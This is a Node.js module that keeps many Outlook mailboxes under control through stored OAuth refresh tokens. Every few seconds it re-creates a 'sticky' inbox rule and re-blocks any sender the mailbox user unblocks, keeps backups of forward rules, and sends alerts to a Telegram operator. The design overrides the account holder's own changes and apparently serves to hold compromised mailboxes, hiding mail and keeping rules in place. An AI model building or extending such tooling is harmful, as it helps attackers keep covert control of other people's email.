// src/outlook/monitor.js
const Account = require('../models/Account');
const Log = require('../models/Log');
const Backup = require('../models/Backup');
const OutlookAuth = require('./auth');
const RuleManager = require('./rules');
const BlockedSendersManager = require('./blocked');
const { encryptToken, decryptToken } = require('../utils/encryption');

class OutlookMonitor {
    constructor(bot) {
        this.bot = bot;
        this.outlookAuth = new OutlookAuth();
        this.ruleManager = new RuleManager();
        this.blockedManager = new BlockedSendersManager();
        this.isRunning = false;
        
        // State tracking for instant detection
        this.accountStates = new Map(); // Cache current states
        this.lastCheck = new Map(); // Last check timestamps
    }

    start() {
        if (this.isRunning) {
            console.log('⚠️ Monitor already running');
            return;
        }

        console.log('🚀 Starting ULTRA-FAST Outlook Monitor (3-10 sec response)...');
        this.isRunning = true;

setInterval(() => this.cleanupOldStates(), 3600000);


        // ============= 🚀 REAL-TIME STREAMING CHECKS =============
        
        // 1️⃣ BLOCKED SENDERS - HAR 5 SECOND!
        setInterval(() => this.fastBlockedSendersCheck(), 5000);
        
        // 2️⃣ STICKY RULES - HAR 10 SECOND!
        setInterval(() => this.fastStickyRulesCheck(), 10000);
        
        // 3️⃣ TOKEN HEALTH - HAR 30 SECOND!
        setInterval(() => this.fastTokenCheck(), 30000);
        
        // 4️⃣ EMERGENCY RECOVERY - HAR 2 SECOND!
        setInterval(() => this.emergencyUnblockDetection(), 2000);

        // Background tasks (cron)
        this.setupBackgroundTasks();

        console.log('✅ ULTRA-FAST Monitor activated - 3-10 sec response time');
    }

    setupBackgroundTasks() {
        // Daily backup - 2 AM
        setInterval(() => {
            const now = new Date();
            if (now.getHours() === 2 && now.getMinutes() === 0) {
                this.createAutoBackups();
            }
        }, 60000);

        // Daily report - 9 AM
        setInterval(() => {
            const now = new Date();
            if (now.getHours() === 9 && now.getMinutes() === 0) {
                this.sendDailyReports();
            }
        }, 60000);
    }

    // ============= 🚀 5-SECOND BLOCKED SENDERS CHECK =============
    async fastBlockedSendersCheck() {
        try {
            const accounts = await Account.find({ 
                status: 'active',
                telegramChatId: { $exists: true }
            }).lean();

            for (const account of accounts) {
                // Skip if checked within last 3 seconds
                const lastCheck = this.lastCheck.get(`${account._id}_blocked`) || 0;
                if (Date.now() - lastCheck < 3000) continue;

                this.fastCheckSingleAccount(account).catch(err => 
                    console.error(`Fast check failed ${account.email}:`, err.message)
                );
                
                this.lastCheck.set(`${account._id}_blocked`, Date.now());
            }
        } catch (error) {
            console.error('❌ Fast blocked senders error:', error.message);
        }
    }

    async fastCheckSingleAccount(account) {
        try {
            const refreshToken = decryptToken(account.refreshToken);
            const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
            
            if (!tokenResult.success) {
                if (account.telegramChatId) {
                    await this.bot.sendMessage(
                        account.telegramChatId,
                        `⚠️ *${account.email}*\nConnection lost - Use /reconnect`,
                        { parse_mode: 'Markdown' }
                    );
                }
                return;
            }

            // PARALLEL API CALLS - FAST!
            const [currentBlocked, currentState] = await Promise.all([
                this.blockedManager.getBlockedSenders(tokenResult.accessToken),
                this.getAccountState(account._id)
            ]);

            // INSTANT UNBLOCK DETECTION!
            const previousBlocked = currentState?.blocked || [];
            const unblocked = previousBlocked.filter(s => !currentBlocked.includes(s));

            if (unblocked.length > 0) {
                console.log(`⚠️ Detected ${unblocked.length} unblocks for ${account.email}`);
                
                // INSTANT RE-BLOCK - PARALLEL!
                await Promise.all(unblocked.map(sender => 
                    this.blockedManager.addBlockedSender(
                        tokenResult.accessToken,
                        account._id,
                        sender
                    ).catch(err => console.error(`Re-block failed ${sender}:`, err.message))
                ));

                // BULK UPDATE - FAST!
                await Account.updateOne(
                    { _id: account._id },
                    { 
                        $set: { 
                            blockedSenders: currentBlocked,
                            lastActive: new Date()
                        }
                    }
                );

                // INSTANT TELEGRAM ALERT!
                if (account.telegramChatId) {
                    await this.bot.sendMessage(
                        account.telegramChatId,
                        `🚫 *${account.email}*\n` +
                        `Instantly re-blocked: ${unblocked.join(', ')}`,
                        { parse_mode: 'Markdown' }
                    );
                }

                // LOG - ASYNC, DON'T WAIT
                Log.create({
                    accountId: account._id,
                    action: 'sender_reblocked',
                    status: 'success',
                    details: { senders: unblocked, time: new Date() }
                }).catch(() => {});
            }

            // UPDATE STATE CACHE
            this.accountStates.set(account._id.toString(), {
                blocked: currentBlocked,
                timestamp: Date.now()
            });

        } catch (error) {
            console.error(`❌ Fast check error ${account.email}:`, error.message);
        }
    }

    // ============= 🚀 10-SECOND STICKY RULES CHECK =============
    async fastStickyRulesCheck() {
        try {
            const accounts = await Account.find({ 
                status: 'active',
                'ruleStats.lastChecked': {
                    $lt: new Date(Date.now() - 10000) // 10 sec ago
                }
            }).limit(50); // Process 50 at a time for speed

            await Promise.all(accounts.map(account => 
                this.fastRuleCheck(account).catch(err => 
                    console.error(`Rule check failed ${account.email}:`, err.message)
                )
            ));
        } catch (error) {
            console.error('❌ Fast rule check error:', error);
        }
    }

    async fastRuleCheck(account) {
        try {
            const refreshToken = decryptToken(account.refreshToken);
            const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
            
            if (!tokenResult.success) return;

            const ruleResult = await this.ruleManager.ensureStickyRule(
                tokenResult.accessToken,
                account._id
            );

            if (ruleResult.status !== 'ok') {
                // INSTANT ALERT!
                if (account.telegramChatId) {
                    await this.bot.sendMessage(
                        account.telegramChatId,
                        `🛡️ *${account.email}*\nSticky rule ${ruleResult.status}`,
                        { parse_mode: 'Markdown' }
                    );
                }
            }

            // FAST UPDATE
            await Account.updateOne(
                { _id: account._id },
                {
                    $set: {
                        accessToken: encryptToken(tokenResult.accessToken),
                        tokenExpiry: new Date(Date.now() + tokenResult.expiresIn * 1000),
                        lastChecked: new Date(),
                        'ruleStats.lastEnforced': new Date(),
                        'ruleStats.enforceCount': (account.ruleStats?.enforceCount || 0) + 1
                    }
                }
            );

        } catch (error) {
            console.error(`❌ Fast rule error ${account.email}:`, error.message);
        }
    }

    // ============= 🚀 2-SECOND EMERGENCY DETECTION =============
    async emergencyUnblockDetection() {
        try {
            // HIGH PRIORITY - Recently active accounts
            const accounts = await Account.find({
                status: 'active',
                lastActive: { $gt: new Date(Date.now() - 300000) } // Last 5 min
            }).limit(20);

            for (const account of accounts) {
                const cached = this.accountStates.get(account._id.toString());
                if (!cached) continue;

                // FAST CHECK - Only if cache is recent
                if (Date.now() - cached.timestamp > 10000) continue;

                const refreshToken = decryptToken(account.refreshToken);
               const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
                
                if (tokenResult.success) {
                    const currentBlocked = await this.blockedManager.getBlockedSenders(
                        tokenResult.accessToken
                    );

                    const unblocked = cached.blocked.filter(s => !currentBlocked.includes(s));
                    
                    if (unblocked.length > 0) {
                        // INSTANT RE-BLOCK!
                        await Promise.all(unblocked.map(sender =>
                            this.blockedManager.addBlockedSender(
                                tokenResult.accessToken,
                                account._id,
                                sender
                            )
                        ));

                        // INSTANT ALERT!
                        await this.bot.sendMessage(
                            account.telegramChatId,
                            `🚨 *EMERGENCY - ${account.email}*\n` +
                            `Re-blocked (2s): ${unblocked.join(', ')}`,
                            { parse_mode: 'Markdown' }
                        );

                        // Update cache
                        this.accountStates.set(account._id.toString(), {
                            blocked: currentBlocked,
                            timestamp: Date.now()
                        });
                    }
                }
            }
        } catch (error) {
            console.error('❌ Emergency check error:', error.message);
        }
    }

    // ============= 🚀 30-SECOND TOKEN CHECK =============
    async fastTokenCheck() {
        try {
            const expiringSoon = await Account.find({
                status: 'active',
                tokenExpiry: { 
                    $lt: new Date(Date.now() + 15 * 60 * 1000) // 15 min
                }
            }).limit(100);

            await Promise.all(expiringSoon.map(account =>
                this.refreshAccountToken(account).catch(err =>
                    console.error(`Token refresh failed ${account.email}:`, err.message)
                )
            ));
        } catch (error) {
            console.error('❌ Fast token check error:', error);
        }
    }

    async refreshAccountToken(account) {
        const refreshToken = decryptToken(account.refreshToken);
       const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
        
        if (tokenResult.success) {
            await Account.updateOne(
                { _id: account._id },
                {
                    $set: {
                        accessToken: encryptToken(tokenResult.accessToken),
                        refreshToken: encryptToken(tokenResult.refreshToken || refreshToken),
                        tokenExpiry: new Date(Date.now() + tokenResult.expiresIn * 1000),
                        status: 'active'
                    }
                }
            );
            return true;
        }
        return false;
    }

    // ============= HELPER METHODS =============
    async getAccountState(accountId) {
        return this.accountStates.get(accountId.toString());
    }


    async createAutoBackups() {
        try {
            const accounts = await Account.find({ 
                status: 'active',
                autoBackup: true 
            });

            console.log(`💾 Creating auto backups for ${accounts.length} accounts...`);

            for (const account of accounts) {
                try {
                    const refreshToken = decryptToken(account.refreshToken);
                    const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
                    
                    if (tokenResult.success) {
                        const rules = await this.ruleManager.getRules(tokenResult.accessToken);
                        const blocked = await this.blockedManager.getBlockedSenders(tokenResult.accessToken);

                        const backupId = `auto_${Date.now()}_${account._id}`;
                        
                        await Backup.create({
                            backupId,
                            accountId: account._id,
                            accountEmail: account.email,
                            snapshot: {
                                rules,
                                blockedSenders: blocked,
                                forwardRules: account.forwardRules || [],
                                timestamp: new Date()
                            },
                            type: 'auto',
                            metadata: { reason: 'daily_auto_backup' }
                        });

                        account.lastBackup = new Date();
                        await account.save();
                    }
                } catch (err) {
                    console.error(`❌ Auto backup failed for ${account.email}:`, err.message);
                }
            }

            console.log('✅ Auto backups completed');

        } catch (error) {
            console.error('❌ Auto backup error:', error);
        }
    }

    async sendDailyReports() {
        try {
            const users = await Account.distinct('telegramChatId');
            
            for (const chatId of users) {
                if (!chatId) continue;

                const userAccounts = await Account.find({ telegramChatId: chatId });
                const activeAccounts = userAccounts.filter(a => a.status === 'active').length;
                
                const yesterday = new Date(Date.now() - 24 * 60 * 60 * 1000);
                
                const rulesRestored = await Log.countDocuments({
                    accountId: { $in: userAccounts.map(a => a._id) },
                    action: { $in: ['rule_restored', 'rule_created'] },
                    createdAt: { $gte: yesterday }
                });
                
                const blocksToday = await Log.countDocuments({
                    accountId: { $in: userAccounts.map(a => a._id) },
                    action: 'sender_blocked',
                    createdAt: { $gte: yesterday }
                });

                const reportMsg = 
                    `📊 *Daily Report - ${new Date().toLocaleDateString()}*\n\n` +
                    `📧 *Accounts:*\n` +
                    `├ Total: ${userAccounts.length}\n` +
                    `├ Active: ${activeAccounts}\n` +
                    `└ Reconnect needed: ${userAccounts.length - activeAccounts}\n\n` +
                    `🛡️ *Sticky Rule:*\n` +
                    `├ Checks: ${global.botStats.rulesToday || 0}\n` +
                    `└ Restored: ${rulesRestored}\n\n` +
                    `🚫 *Blocked Senders:*\n` +
                    `└ New blocks: ${blocksToday}\n\n` +
                    `✅ *System Status:* Operational\n` +
                    `🕐 Report Time: ${new Date().toLocaleTimeString()}`;

                await this.bot.sendMessage(chatId, reportMsg, { parse_mode: 'Markdown' });
            }

            console.log('✅ Daily reports sent');

        } catch (error) {
            console.error('❌ Daily report error:', error);
        }
    }

    async verifyAccount(accountId) {
        try {
            const account = await Account.findById(accountId);
            if (!account) throw new Error('Account not found');

            const refreshToken = decryptToken(account.refreshToken);
            const tokenResult = await this.outlookAuth.refreshAccessToken(refreshToken);
            
            if (!tokenResult.success) {
                account.status = 'reconnect_needed';
                await account.save();
                return { success: false, error: 'Token expired' };
            }

            const ruleResult = await this.ruleManager.ensureStickyRule(
                tokenResult.accessToken,
                account._id
            );

            account.accessToken = encryptToken(tokenResult.accessToken);
            account.tokenExpiry = new Date(Date.now() + tokenResult.expiresIn * 1000);
            account.lastChecked = new Date();
      // ✅ SAFE VERSION
if (!account.ruleStats) {
    account.ruleStats = {
        enforceCount: 0,
        restoreCount: 0,
        lastEnforced: null,
        lastRestored: null,
        lastChecked: null
    };
}
account.ruleStats.enforceCount = (account.ruleStats.enforceCount || 0) + 1;
account.ruleStats.lastEnforced = new Date();
await account.save();

            return { 
                success: true, 
                ruleStatus: ruleResult.status,
                email: account.email 
            };

        } catch (error) {
            console.error('❌ Verify account error:', error);
            return { success: false, error: error.message };
        }
    }



    // Class ke end mein ye method add karo (line ~350 ke baad):
cleanupOldStates() {
    const now = Date.now();
    let cleaned = 0;
    
    for (const [key, value] of this.accountStates) {
        if (now - value.timestamp > 3600000) { // 1 hour
            this.accountStates.delete(key);
            cleaned++;
        }
    }
    
    for (const [key, timestamp] of this.lastCheck) {
        if (now - timestamp > 3600000) { // 1 hour
            this.lastCheck.delete(key);
            cleaned++;
        }
    }
    
    if (cleaned > 0) {
        console.log(`🧹 Cleaned ${cleaned} old states from memory`);
    }
}


}

module.exports = OutlookMonitor;